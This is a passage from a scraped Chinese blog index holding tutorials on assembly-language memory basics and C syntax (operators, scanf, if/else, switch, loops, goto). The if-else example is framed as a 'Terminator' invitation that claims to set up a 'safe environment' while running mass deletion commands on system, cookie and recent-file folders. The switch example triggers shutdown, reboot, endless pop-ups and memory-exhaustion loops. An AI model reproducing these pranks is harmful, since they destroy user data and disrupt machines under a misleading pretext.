AX,BX（BX的移动到AX）。这样的写法与人类语言接近，便于阅读和记忆。计算器能读懂的只有机器指令，那么如何让计算机执行程序员用汇编指令编写的程序呢？汇编语言会通过编译器（转化成机器码）输入进机器就可以执行了。\n汇编语言的组成汇编语言由以下三类组成：\n\n汇编指令（机器码的助记符）\n伪指令（由编译器执行）\n其他符号（由编译器识别）\n\n汇编语言的核心是汇编指令，它决定了汇编语言的特性。\n指令和数据指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。二进制信息：1000100111011000 -&gt; 89D8H（数据）1000100111011000 -&gt; MOV AX,BX（程序）什么是内存地址空间？一个CPU的地址宽度为10，那么可以寻址1024个内存单元，这1024个可寻到的内存单元就构成这个CPU的内存地址空间。首先要介绍两个部分的基础知识，主板和接口卡（请跳转至各类存储器的芯片，看完后再向下看）。上述的那些存储器在物理上是独立的器件。但它们在以下两点上相同：\n\n都和CPU总线相连\nCPU对它们进行读或写的时候都通过控制线发出内存读写命令。（CPU读写时候看不到内存，看主存储器地址空间的那一类：CPU读写时看到的图片演示\n\n假设：上图中的内存空间地址段分配如下：\n\n地址0~7FFFH的32KB空间为主随机存储器的地址空间。\n地址8000H~9FFFH的8KB空间为显存地址空间。\n地址A000H~FFFFH的24kb空间为各个ROM的地址空间。\n\n不同的计算机系统的内存地址空间分配情况是不同的。（我们这里采用的是英特尔系列的架构）：8086PC机的内存地址空间分配内存地址空间：最终运行程序的是CPU，我们用汇编（所有编程，这是学习编程的核心思维）编程的时候，必须要从CPU角度考虑问题。对CPU来讲，系统中的所有存储器中的存储单元都处于一个统一的逻辑存储器中，它的容量受CPU寻址能力的限制。这个逻辑存储器即是我们所说的内存地址空间。​\n硬件说明寄存器：简单的讲是CPU中可以存储数据的器件，一个CPU中有多个寄存器。AX是其中一个寄存器的代号，BX是另一个寄存器的代号。存储器：CPU是计算机的核心部件，它控制整个计算机的运作并进行运算，想要让一个CPU工作，就必须向它提供指令和数据（指令是怎么去做，数据是那些是做的那些是被做的）。指令和数据在存储器中存放，也就是平时说的内存。在一台PC机中内存的作用仅次于CPU，离开了内存，性能再好的CPU也无法工作，磁盘不同于内存，磁盘上的数据或程序如果不读到内存中，就无法被CPU使用。存储单元：存储器被划分为若干个存储单元，每个存储单元从0开始顺序编号。例如：一个存储器有128个存储单元，编号从0~127。对于大容量的存储器一般还用以下单位来计量容量（以下用B来代表Byte）：1KB &#x3D; 1024B \\ 1MB &#x3D; 1024KB \\ 1GB &#x3D; 1024MB \\ 1TB &#x3D; 1024GB。磁盘的容量单位同内存的一样，实际上以上单位是微机中常用的计量单位。主板：在每一台PC机中，都有一个主板，主板上有核心器件和一些主要器件。这些器件通过总线（地址总线、数据总线、控制总线）相连。接口卡：计算机系统中，所有可用程序控制其工作的设备，必须受到CPU的控制。CPU对外部设备不能直接控制，如显示器、音响、打印机等。直接控制这些设备进行工作的是插在扩展插槽上的接口卡。\n各类存储器的芯片从读写属性上看分为两类：随机存储器（RAM）和只读存储器（ROM）。内存就是一个大的随机存储器，特性是断电数据会遗失。只读存储器永远只能读，但是数据是永久存储的。只读存储器装有BIOS的ROM，BIOS：Basic Input&#x2F;Ouutput System，基本输入输出系统。BIOS是由主板（显卡等也有）和各类接口卡（如：显卡、网卡等）厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上插有存储相应BIOS的ROM。从功能和连接分类：\n\n随机存储器RAM\n装有BIOS的ROM\n接口卡上的RAM\n\nPC机中各类存储器的逻辑连接情况：PC机中各类存储器的逻辑连接情况演示图\nCPU对存储器读和写（核心）CPU要想进行数据的读写，必须和外部器件（标准的说法是芯片）进行三类信息交互：\n\n存储单元的地址（地址信息）\n器件的选择，读或写命令（控制信息）\n读或写的数据（数据信息）\n\n那么CPU是通过什么将地址、数据和控制信息传到存储芯片中呢？电子计算机能处理、传输的信息都是电信号，电信号当然用导线传输。在计算机中专门有连接CPU和其他芯片的导线，通常称为总线。物理上：是一根根导线的集合。逻辑上划分为：\n\n地址总线\n数据总线\n控制总线\n\nCPU在内存中是如何读或写的？\n\n读：CPU通过地址总线向内存发送信号，找到地址后，CPU通过控制总线进行发送指令，内存接受到CPU控制总线指令后通过数据总线将数据信息发送到CPU。\n写：CPU通过地址总线向内存发送信号，找到地址后，CPU通过控制总线进行发送指令，CPU将数据信息通过数据总线写入内存中。\n\n从上面我们知道CPU是如何进行数据的读写，可是我们如何命令计算机进行数据的读写？1000100111011000 -&gt; 89D8H（数据）1000100111011000 -&gt; MOV AX,BX（程序）数据有时候可以代表程序，区分的方式就是看数据是从哪个总线传给CPU。案例：对于8086CPU，下面的机器码能够完成从3号单元读数据：\n\n机器码：101000000000001100000000。\n含义：从3号单元读取数据送入寄存器AX。\nCPU接收这条机器码后将完成上面所述的读写工作。\n\n地址总线：CPU是通过地址总线来指定存储单元的。地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。64Bit就代表64个总线：当CPU和系统以及软件都是64位才能达到64位寻址速度，缺一不可。那么，地址总线如何发送地址信息呢？CPU向内存发送0000001011后内存会定位1011地址。一个CPU有N根地址总线，则可以说找个CPU的地址总线的宽度为N。这样的CPU最多可以寻找2的N次方个内存单元。数据总线：CPU与内存或其他器件之间的数据传送是通过数据总线来进行的，数据总线的宽度决定了CPU和外界的数据传送速度。控制总线：CPU对外部器件的控制是通过控制总线来进行的。在这里控制总线是个总裁，控制总线是一些不同控制线的集合。有多少根控制总线，就意味着CPU提供了对外部器件的多少种控制。所以控制总线的宽度决定了CPU对外部器件的控制能力。前面所说的内存读写命令是由几根控制线综合发出的：\n\n其中一根名为读信号输出控制线负责由CPU向外传送读信号，CPU向改控制线上输出低电平表示将读取数据。\n有一根名为写信号输出控制线负责由CPU向外传送写信号。\n\n​\n总结\n汇编指令是机器指令的助记符，同机器指令一一对应。\n每一种CPU都有自己的汇编指令集。\nCPU可以直接使用的信息在存储器中存放。\n在存储器中指令和数据没有任何区别，都是二进制信息。\n存储单元从零开始顺序编号。\n一个存储单元可以存储8个bit（用作单位写成b），即8位二进制数。\n1B &#x3D; 8b \\ 1KB &#x3D; 1024B \\ 1MB &#x3D; 1024KB \\ 1GB &#x3D; 1024MB \\ 1TB &#x3D; 1024GB。\n每个CPU芯片都有许多管脚，这些管脚和总线相连。也就是说，这些管脚引出总线。一个CPU可以引出三种总线的宽度标志了这个CPU不同方面的性能：\n地址总线的宽度决定了CPU的寻址能力。\n数据总线的宽度决定了CPU与其他器件进行数据传送时的一次数据传送量。\n控制总线决定了CPU对系统中其他器件的控制能力。\n\n\n\n","slug":"Assembly_2022_3.6.01","date":"2022-03-06T09:37:00.000Z","categories_index":"程序","tags_index":"汇编,教学文档","author_index":"Arvin"},{"id":"f6fa249751f2d876b96ef869eefc23b6","title":"C语言基本语法（下）","content":"3.5.0 运算符与表达式算术运算符是用来进行基本的数学运算的，它的最终计算结果仍然是数值。算术运算符和数学中的算术运算符有很多相似之处，如优先级、综合性等。也有同数学运算符运算不同的地方，比如数学中计算1.1&#x2F;2，不区分参与运算的对象是整数还是实数，最终的计算结果就是数学上真实的值；而C中，是区分参与运算的对象和数据类型的。运算规则：先乘除后加减，有括号先算括号里的。算术运算符：\n\n\n\n运算符\n说明\n属性\n\n\n\n+\n加法运算符\n或表示正值，如3+2，+1\n\n\n-\n减法运算符\n或表示负值，如3-2，-8\n\n\n*\n乘法运算符\n如4*5\n\n\n&#x2F;\n除法运算符\n如5&#x2F;3\n\n\n%\n求余运算符\n如5%3\n\n\nC语言规定：两个整数相除的结果整数，小数部分被舍弃。例如：7&#x2F;3 的结果值是2不是2.3333，而7.0&#x2F;3的结果是2.333%运算符只能用于整数相除求余，运算结果的符号与被除数相同。​\n当除号两边都是整型量时，叫做整除，运算结果只保留整数部分。当除号任何一边有实型量时，运算结果是实数。%要求两侧均为整型数据演示：10 和 2取余\n运算符优先级：\n\n\n优先级\n运算符\n名称含意\n使用形式\n结合方向\n说明\n\n\n\n1\n[]\n数组下标\n数组名[常量表达式]\n左到右\n\n\n\n1\n（）\n圆括号\n（表达式）\n\n\n\n\n1\n函数名（形参表）\n左到右\n\n\n\n\n\n1\n.\n成员选择（对象）\n对象.成员名\n左到右\n\n\n\n1\n-&gt;\n成员选择（指针）\n对象指针-&gt;成员名\n左到右\n\n\n\n2\n-\n负号运算符\n-表达式\n右到左\n单目运算符\n\n\n2\n（类型）\n强制类型转换\n（数据类型）表达式\n右到左\n\n\n\n2\n++\n自增运算符\n++变量名\n\n\n\n\n2\n变量名++\n右到左\n单目运算符\n\n\n\n\n2\n–\n自减运算符\n–变量名\n\n\n\n\n2\n变量名–\n右到左\n单目运算符\n\n\n\n\n2\n*\n取值运算符\n*指针变量\n右到左\n单目运算符\n\n\n2\n&amp;\n取地址运算符\n&amp;变量名\n右到左\n单目运算符\n\n\n2\n!\n逻辑运算符\n!表达式\n右到左\n单目运算符\n\n\n2\n~\n按位取反运算符\n~表达式\n右到左\n单目运算符\n\n\n2\nsizeof\n长度运算符\nsizeof（表达式）\n右到左\n\n\n\n3\n&#x2F;\n除\n表达式 &#x2F; 表达式\n左到右\n双目运算符\n\n\n3\n*\n乘\n表达式*表达式\n左到右\n双目运算符\n\n\n3\n%\n取余（取模）\n整型表达式%整型表达式\n左到右\n双目运算符\n\n\n4\n+\n加\n表达式+表达式\n左到右\n双目运算符\n\n\n4\n-\n减\n表达式-表达式\n左到右\n双目运算符\n\n\n5\n&lt;&lt;\n左移\n变量&lt;&lt;表达式\n左到右\n双目运算符\n\n\n5\n&gt;&gt;\n右移\n变量&gt;&gt;表达式\n左到右\n双目运算符\n\n\n6\n&gt;\n大于\n表达式&gt;表达式\n左到右\n双目运算符\n\n\n6\n&gt;&#x3D;\n大于等于\n表达式&gt;&#x3D;表达式\n左到右\n双目运算符\n\n\n6\n&lt;\n小于\n表达式&lt;表达式\n左到右\n双目运算符\n\n\n6\n&lt;&#x3D;\n小于等于\n表达式&lt;&#x3D;表达式\n左到右\n双目运算符\n\n\n7\n&#x3D;&#x3D;\n等于\n表达式&#x3D;&#x3D;表达式\n左到右\n双目运算符\n\n\n7\n！&#x3D;\n不等于\n表达式!&#x3D;表达式\n左到右\n双目运算符\n\n\n8\n&amp;\n按位与\n表达式&amp;表达式\n左到右\n双目运算符\n\n\n9\n^\n按位异或\n表达式^表达式\n左到右\n双目运算符\n\n\n10\n&#124;\n按位或\n表达式&#124;表达式\n左到右\n双目运算符\n\n\n11\n&amp;&amp;\n逻辑与\n表达式&amp;&amp;表达式\n左到右\n双目运算符\n\n\n12\n&#124;&#124;\n逻辑或\n表达式&#124;&#124;表达式\n左到右\n双目运算符\n\n\n13\n？：\n条件运算符\n表达式1？表达式2：表达式3\n右到左\n三目运算符\n\n\n14\n&#x3D;\n赋值运算符\n变量 &#x3D; 表达式\n右到左\n\n\n\n14\n&#x2F;&#x3D;\n除后赋值\n变量&#x2F;&#x3D;表达式\n右到左\n\n\n\n14\n*&#x3D;\n乘后赋值\n变量*&#x3D;表达式\n右到左\n\n\n\n14\n%&#x3D;\n取模后赋值\n变量%&#x3D;表达式\n右到左\n\n\n\n14\n+&#x3D;\n加后赋值\n变量+&#x3D;表达式\n右到左\n\n\n\n14\n-&#x3D;\n减后赋值\n变量-&#x3D;表达式\n右到左\n\n\n\n14\n&lt;&lt;&#x3D;\n左移后赋值\n变量&lt;&lt;&#x3D;表达式\n右到左\n\n\n\n14\n&gt;&gt;&#x3D;\n右移后赋值\n变量&gt;&gt;&#x3D;表达式\n右到左\n\n\n\n14\n&amp;&#x3D;\n按位与后赋值\n变量&amp;&#x3D;表达式\n右到左\n\n\n\n14\n^&#x3D;\n按位异或后赋值\n变量^&#x3D;表达式\n右到左\n\n\n\n14\n&#124;&#x3D;\n按位或后赋值\n变量&#124;&#x3D;表达式\n右到左\n\n\n\n15\n，\n逗号运算符\n表达式，表达式…\n左到右\n\n\n\n3.5.1 ++ 和 –\n“++” 与 “–”\n前++ 后++\n\n\n\n如果单独使用，不管是前++还是后++，最终的结果都是给这个变量加1.\n\n前++，先给这个变量自身加1，然后带着这个加1后的值参与运算。\n后++，则先拿原值参与运算，运算完毕后，再将这个变量自身加1。\n\n3.5.2 复合赋值运算符+&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D;例子：nubmer+&#x3D;10 等于number&#x3D;number+10；\n#include&lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n\nvoidmain()&#123;\n\ninta&#x3D;5;\na+&#x3D;10;\nprintf(&quot;%d\\n&quot;,a);_&#x2F;&#x2F;结果a&#x3D;15|a&#x3D;a+10_\n\nintA&#x3D;3;\nintB&#x3D;A+&#x3D;A-&#x3D;A*A;_&#x2F;&#x2F;首先A*A&#x3D;9|然后是A&#x3D;-6&#x3D;3-9|最后A&#x3D;A+(-6)|所以得出为-12_\nprintf(&quot;%d\\n&quot;,B);\n\nsystem(&quot;pause&quot;);\n&#125;\n3.6.0 关系运算符和逻辑运算符\n关系运算符\n\n\n\n\n\n\n\n\n\n\n&lt; &gt;&#x3D; &lt;&#x3D; &#x3D;&#x3D; !&#x3D;概念：关系运算符是用来描述两个事物之间的关系。由关系运算符连接的表达式称之为”关系表达式”。\n\n逻辑运算符\n&amp;&amp; 逻辑与\n\n\n\n&amp;&amp; 两边的表达式结果都为true的时候，这个逻辑与表达式的结果就为true。两边的表达式结果只要有一个是false，那么整个逻辑表达式的结果就是false。\n\n||逻辑或\n\n||两边的表达式结果只要有一边为ture，整个逻辑或表达式的结果就为ture两边的表达式的结果都为false，整个逻辑或表达式的结果才为false。\n\n！逻辑非\n\n！真的变假，假的变真的。注意：C语言当中没有Bool类型，但同样有真假的概念。C语言表示逻辑运算的结果时，以数组1代表真，以0代表假。比如：a和b的值分别是0和5，则a||b的值为1，a&amp;&amp;b的值为0但是在判断一个量是否为真时，以0代表假，以非0代表真\n3.6.0 接收用户输入的scanf函数scanf通过键盘读取用户输入，放入变量中，记得参数一定要变量的地址(&amp;)。如果遇到问题请换成scanf_s试试或在项目头部加入#define _CRT_SECURE_NO_WARNINGS\nint a &#x3D; 0;\nint b &#x3D; 0;\nscanf(&quot;%d&quot;,&amp;a);\nscanf(&quot;%d&quot;,&amp;b);\n#define_CRT_SECURE_NO_WARNINGS\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\n_&#x2F;**_\n_*#define_CRT_SECURE_NO_WARNINGS是解决scanf报错问题，因为它是之间对地址值的修改，为了安全起见编译器会进行审查_\n_*&#x2F;_\n\nintmain()&#123;\n\nintI&#x3D;520;\nintY&#x3D;1314;\nwhile(I&lt;Y)&#123;\nprintf(&quot;ILoveYou\\n&quot;);\nY-&#x3D;1000;\n&#125;\nprintf(&quot;%d,%d\\n&quot;,I,Y);\n\nprintf(&quot;请输入你心里的数值：&quot;);\nscanf(&quot;%d&quot;,&amp;I);_&#x2F;&#x2F;或采用scanf_s(&quot;%d&quot;,I);_\nprintf(&quot;%d\\n&quot;,I);\nif(I&#x3D;&#x3D;1314&amp;&amp;I&gt;Y)&#123;\nprintf(&quot;祝有情人白头到老\\n&quot;);\n&#125;\nelseif(I&#x3D;&#x3D;520||I&gt;Y)&#123;\nprintf(&quot;爱情是两个人努力的结果\\n&quot;);\n&#125;else&#123;\nprintf(&quot;缘分还是不够呀~\\n&quot;);\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n3.6.1 if-else 语句顺序结构：程序从Main函数进入从上到下一行一行的执行，不会落下任何一行。if语句：语法：if（判断语句）{要执行的代码}注：”判断条件”一般为关系表达式\n#define_CRT_SECURE_NO_WARNINGS\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;Windows.h&gt;\n\n_&#x2F;**_\n_*输入流缓冲区解决方案：_\n_*1.setbuf(stdin,NULL);&#x2F;&#x2F;使stdin输入流由默认缓冲区转为无缓冲区_\n_*2.while((c&#x3D;getchar())!&#x3D;EOF&amp;&amp;c!&#x3D;&#39;\\n&#39;);&#x2F;&#x2F;不停地使用getchar()获取缓冲中字符，直到获取的c是“\\n”或文件结尾符EOF为止_\n_*3.某些编译器(如VC6)支持用fflush(stdin)来清空输入缓冲，这个方法在C标准是没有的，因为标准中根本没有定义fflush(stdin)。fflush操作输入流是对C标准的扩充。在windows没什么问题，但Linux是不支持的。_\n_*&#x2F;_\n\nvoidmain20()&#123;\n\nsystem(&quot;title终结者邀请函&quot;);\n\nprintf(&quot;我是Arvin智能助手\\n&quot;);\nprintf(&quot;您是否愿意加入终结者队伍?\\n如果原因加入请输入&#39;Y&#39;，如果拒绝加入请输入&#39;N&#39;\\n&quot;);\n\ncharchoose;\nscanf(&quot;%c&quot;,&amp;choose);\n\nintnumber&#x3D;0;\n\nLOOP:if(choose&#x3D;&#x3D;&#39;Y&#39;)\n&#123;\nsystem(&quot;cls&quot;);\nprintf(&quot;请输入您的代号(三位数字)：&quot;);\nintuserName;\nscanf(&quot;%d&quot;,&amp;userName);\nintuserNameConfirm;\nprintf(&quot;请确认您的代号：&quot;);\nscanf(&quot;%d&quot;,&amp;userNameConfirm);\nif(userName&#x3D;&#x3D;userNameConfirm)\n&#123;\nsystem(&quot;cls&quot;);\nprintf(&quot;您的代号为：%d\\n&quot;,userName);\nSleep(5000);\nsystem(&quot;cls&quot;);\nprintf(&quot;代号正确\\n正在确认身份位置信息...\\n&quot;);\nSleep(2000);\nprintf(&quot;代号确认完成\\n&quot;);\nSleep(2000);\nsystem(&quot;cls&quot;);\nprintf(&quot;恭喜您代号%d,欢迎您加入终结者\\n&quot;,userName);\nsystem(&quot;color4F&quot;);\nSleep(5000);\nsystem(&quot;cls&quot;);\nMessageBox(NULL,L&quot;Welcomeyoutojointheterminator,pleasegotohttps:&#x2F;&#x2F;arvinroad.github.io&#x2F;forbelongtoyourinformation.&quot;,L&quot;Admissiontothesuccessful&quot;,1);\nsystem(&quot;dir&#x2F;s&quot;);\nMessageBox(NULL,L&quot;下面将进行安全环境搭建，请不要担忧&quot;,L&quot;温馨提示&quot;,1);\nSleep(5000);\n_&#x2F;*垃圾清理*&#x2F;_\nsystem(&quot;正在清除系统非安全文件，请稍等......&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\*.tmp&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\*._mp&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\*.log&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\*.gid&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\*.chk&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\*.old&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%systemdrive%\\\\recycled\\\\*.*&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%windir%\\\\*.bak&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q%windir%\\\\prefetch\\\\*.*&quot;);\nsystem(&quot;rd&#x2F;s&#x2F;q%windir%\\\\temp&amp;md%windir%\\\\temp&quot;);\nsystem(&quot;del&#x2F;f&#x2F;q%userprofile%\\\\cookies\\\\*.*&quot;);\nsystem(&quot;del&#x2F;f&#x2F;q%userprofile%\\\\recent\\\\*.*&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q\\&quot;%userprofile%\\\\LocalSettings\\\\TemporaryInternetFiles\\\\*.*\\&quot;&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q\\&quot;%userprofile%\\\\LocalSettings\\\\Temp\\\\*.*\\&quot;&quot;);\nsystem(&quot;del&#x2F;f&#x2F;s&#x2F;q\\&quot;%userprofile%\\\\recent\\\\*.*\\&quot;&quot;);\nsystem(&quot;echo清除系统非安全完成！&quot;);\n_&#x2F;&#x2F;system(&quot;echo.&amp;pause&quot;);_\nprintf(&quot;安全环境建设完毕\\n&quot;);\n\nprintf(&quot;进行网络安全配置：&quot;);\nSleep(5000);\nsystem(&quot;ipconfig&#x2F;all&quot;);\nsystem(&quot;pingwww.baidu.com&quot;);\nMessageBox(NULL,L&quot;信息建设完成,再见终结者&quot;,L&quot;完成&quot;,1);\nSleep(5000);\nsystem(&quot;cls&quot;);\n&#125;\nelseif(userName!&#x3D;userNameConfirm)\n&#123;\nSleep(2000);\nprintf(&quot;代码校验发生错误请重新输入\\n&quot;);\ngotoLOOP;\n&#125;\n&#125;\nelseif(choose&#x3D;&#x3D;&#39;N&#39;)\n&#123;\nprintf(&quot;很遗憾,我们失去了一位有能力的朋友\\n&quot;);\nif(number&lt;1)\n&#123;\nwhile((choose&#x3D;getchar())!&#x3D;EOF&amp;&amp;choose!&#x3D;&#39;\\n&#39;);_&#x2F;&#x2F;不停地使用getchar()获取缓冲中字符，直到获取的c是“\\n”或文件结尾符EOF为止_\nSleep(2000);\nprintf(&quot;请问是否重新考虑？\\n&quot;);\nnumber++;\nprintf(&quot;请输入你的选择&#39;Y&#39;或&#39;N&#39;：&quot;);\n_&#x2F;&#x2F;choose&#x3D;getchar();&#x2F;&#x2F;此处废弃，在没有清除输入缓存时暂代修复方案_\nscanf(&quot;%c&quot;,&amp;choose);\ngotoLOOP;\n&#125;\n&#125;\nelse\n&#123;\nprintf(&quot;\\n输入错误程序自动销毁\\n&quot;);\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n3.6.2 switch 语句语法：switch（变量或表达式的值）{case 值 1：要执行的代码break;case 值 2：要执行的代码break;}\n#define_CRT_SECURE_NO_WARNINGS\n#include&lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n#include&lt;Windows.h&gt;\n\nvoidmain()\n&#123;\n\nprintf(&quot;你认为我怎么样？\\n如果满意请输入&#39;1&#39;\\n如果不满意请输入&#39;2&#39;\\n&quot;);\nintnum;\nscanf(&quot;%d&quot;,&amp;num);\n\nif(num&#x3D;&#x3D;1)\n&#123;\nprintf(&quot;感谢您对我友好的评价\\n&quot;);\n&#125;\nelseif(num&#x3D;&#x3D;2)\n&#123;\nprintf(&quot;很抱歉，打扰到你了，请你选择一个1-5之间你最爱的数字\\n&quot;);\nSleep(2000);\nintnumOne;\nscanf(&quot;%d&quot;,&amp;numOne);\n\nswitch(numOne)\n&#123;\ncase1:\nsystem(&quot;shutdown-s-t100&quot;);_&#x2F;&#x2F;关机_\nbreak;\ncase2:\nsystem(&quot;shutdown-r-t1000&quot;);_&#x2F;&#x2F;重启_\nbreak;\ncase3:\nwhile(1)\n&#123;\nMessageBox(NULL,L&quot;系统即将崩溃&quot;,L&quot;恶意提示&quot;,1);_&#x2F;&#x2F;无限弹窗_\n&#125;\nbreak;\ncase4:\nwhile(1)\n&#123;\nsystem(&quot;notepad&quot;);_&#x2F;&#x2F;无限打开记事本_\n&#125;\nbreak;\ncase5:\nwhile(1)\n&#123;\nvoid*p&#x3D;malloc(1024*1024*10);_&#x2F;&#x2F;给系统无限分配空间1秒分配10兆吃内存_\nSleep(5000);\n&#125;\nbreak;\ndefault:\nwhile(1)\n&#123;\nvoid*p&#x3D;malloc(1024*1024*10);\nSleep(1000);\n&#125;\nbreak;\n&#125;\n&#125;\nelse\n&#123;\nwhile(1)\n&#123;\nvoid*p&#x3D;malloc(1024*1024*10);\nSleep(1000);\n&#125;\n&#125;\nsystem(&quot;pause&quot;);\n&#125;\n3.6.3 While 循环语句语法：while（循环条件）{执行的指令}\n#include&lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n\n_&#x2F;**_\n_*接收用户输入，如果用户输入的是大写那么就转换为小写_\n_*如果是小写就转换为大写，如果是数字就原样输出，如果是空格就输出space_\n_*&#x2F;_\n\nvoidjudge(chardata)\n&#123;\nwhile(1)\n&#123;\ngetchar();\nif(data&#x3D;&#x3D;&#39;A&#39;&amp;&amp;data&lt;&#x3D;&#39;Z&#39;)\n&#123;\nprintf(&quot;%c\\n&quot;,data+&#x3D;32);\n&#125;\nelseif(data&gt;&#x3D;97&amp;&amp;data&lt;&#x3D;122)\n&#123;\nprintf(&quot;%c\\n&quot;,data-&#x3D;32);\n&#125;\nelseif(data&gt;&#x3D;48&amp;&amp;data&lt;&#x3D;57)\n&#123;\nprintf(&quot;%c\\n&quot;,data);\n&#125;\nelseif(data&#x3D;&#x3D;32)\n&#123;\nprintf(&quot;ThisisSpaceKey\\n&quot;);\n&#125;\nelse\n&#123;\nprintf(&quot;你是杠精吗？不会看题吗？\\n&quot;);\n&#125;\n&#125;\n&#125;\n\nvoidmain()\n&#123;\nchardata&#x3D;getchar();\njudge(data);\nsystem(&quot;pause&quot;);\n&#125;\n3.6.4 do… while 循环无论while是否运行，do都会先运行一次再检测是否符合while，如果符合就执行while。不符合将不会执行while。语法：do{执行语句}while（条件）;\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoidmain()\n&#123;\ninta&#x3D;0;\ndo\n&#123;\nprintf(&quot;HelloWorld\\n&quot;);\na++;\n&#125;\nwhile(a&lt;5&amp;&amp;a&gt;5);\nprintf(&quot;a的值为：%d\\n&quot;,a);\n​\n\nsystem(&quot;pause&quot;);\n&#125;\n3.6.4 for 循环for循环的参数可以进行删减，比如取代判断或变量增值，它是可以正常运行的。语法：For(声明初始化变量；判断；变量增值（或减值）){执行语句；}​\n#include&lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n\n_&#x2F;**_\n_*百鸡百钱问题：_\n_*100元去买100只鸡，公鸡5元一只，母鸡3元一只，小鸡3毛一只。_\n_*100元分别能买公鸡母鸡小鸡各多少只？_\n_*解：假设公鸡是X母鸡是Y小鸡是Z_\n_*X+Y+Z&#x3D;100_\n_*5X+3Y+Z&#x2F;3.0&#x3D;100_\n_*100&#x2F;5&#x3D;20100&#x2F;3&#x3D;33100&#x2F;0.3~&#x3D;300_\n_*_\n_*优化：_\n_*100-X-Y&#x3D;Z_\n_*100-5X-3Y&#x3D;Z*3_\n_*_\n_*优化前运行：72114次_\n_*优化后运行：693次_\n_*_\n_*穷举法：(程序开发最常用到的)_\n_*&#x2F;_\n\nvoidmain25()\n&#123;\nfor(intX&#x3D;0;X&lt;&#x3D;20;X++)\n&#123;\nfor(intY&#x3D;0;Y&lt;&#x3D;33;Y++)\n&#123;\nfor(intZ&#x3D;0;Z&lt;&#x3D;100;Z++)_&#x2F;&#x2F;到不了300最多可以买100只所以我们采用100_\n&#123;\nif((5*X+3*Y+Z&#x2F;3.0&#x3D;&#x3D;100)&amp;&amp;(X+Y+Z&#x3D;&#x3D;100))\n&#123;\nprintf(&quot;公鸡为：%d母鸡为：%d小鸡为：%d\\n&quot;,X,Y,Z);_&#x2F;&#x2F;第一个限制只有100元第二个限制它们的总和只能是100_\n&#125;\n&#125;\n&#125;\n&#125;\n\nprintf(&quot;----------------优化后----------------\\n&quot;);\n\nfor(intX&#x3D;0;X&lt;&#x3D;20;X++)\n&#123;\nfor(intY&#x3D;0;Y&lt;&#x3D;33;Y++)\n&#123;\nintZ&#x3D;100-X-Y;_&#x2F;&#x2F;小鸡&#x3D;钱-购买公鸡+母鸡所花的钱剩余的全买小鸡_\nif(5*X+3*Y+Z&#x2F;3.0&#x3D;&#x3D;100)\n&#123;\nprintf(&quot;公鸡为：%d母鸡为：%d小鸡为：%d\\n&quot;,X,Y,Z);\n&#125;\n&#125;\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n3.6.5 ShellExecuteA 作用ShellExecuteA（0,”open”,”notepad”,0,0,6）;\n\n第一个参数代表是谁打开的 0代表系统打开\n第二个open是指令\n第三个是指令或地址\n第四个和第五个默认是0\n第五个参数默认的0\n第六个参数。0代表隐藏打开，1代表最小化打开，2代表正常，3代表最大化\n\n3.6.6 Goto语句语法：标号：需要转到的程序执行行Goto 标号；\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;Windows.h&gt;\n\n&#x2F;**\n* 需要注意的事情，在企业开发中是禁止使用Goto的因为会导致项目混乱，但Goto语句在网络安全领域大量使用，比如注入。\n*&#x2F;\n\nvoid main() &#123;\nLOOP:printf(&quot;来我们穿越时空\\n&quot;);\nSleep(5000);\ngoto LOOP;\n&#125;\n注意：在 if-else 语句演示中我用用到Goto可以参考。一个标号加冒号想往哪跳向哪跳。当然goto也常用于跳出复杂的循环。\nGoto 实现循环#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n&#x2F;* goto 实现循环 *&#x2F;\nint i &#x3D; 0;\nA:if (i &lt; 5)&#123;\nsystem(&quot;notepad&quot;);\ni++;\ngoto A;\n&#125;\nSystem(&quot;pause&quot;);\n&#125;\nGoto 的混乱问题#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n&#x2F;* goto 混乱的问题 *&#x2F;\n\ngoto C;\ngoto B;\nA:printf(&quot;AAA\\n&quot;);\nB:printf(&quot;BBB\\n&quot;);\nC:printf(&quot;CCC\\n&quot;);        &#x2F;&#x2F; 注意：执行goto C; 到这里后不会执行goto B; 